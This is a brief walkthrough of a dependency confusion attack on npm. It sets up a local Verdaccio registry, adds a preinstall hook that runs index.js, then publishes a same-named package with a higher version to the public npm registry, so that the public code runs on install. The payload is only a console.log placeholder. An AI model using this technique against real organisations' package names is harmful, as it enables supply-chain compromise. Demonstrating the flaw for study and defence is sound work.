## dependency confusion demo

### I) Setup local NPM registry

```
Verdaccio is a simple, zero-config-required local private NPM registry
use docker to spin it up easily:

docker run -it --rm --name verdaccio -p 4873:4873 verdaccio/verdaccio

create local npm user:
npm adduser --registry http://0.0.0.0:4873
npm login --registry http://0.0.0.0:4873

create package:
npm init

After successful creation of the package.json file , we need to edit the created file to execute our own scripts and command
add the line in scripts 
"preinstall": "node index.js",

Now create the index.js
console.log('this is legitimate code')

then we publish it to local npm registry:
npm publish --registry http://0.0.0.0:4873 

install the project: 
npm install ysfox
```

### II) Exploiting the bug

```
make sure that the package doesnt exist in https://www.npmjs.com/
push a package of the same name to npmjs, with a higher version range: 1.999.99

edit index.js to something like : console.log('this is a malicious code')

npm login // login https://www.npmjs.com/
npm publish

https://www.npmjs.com/package/ysfox


Then install the package in a new project
npm install ysfox

the code we published at npmjs.com is the one getting executed
```
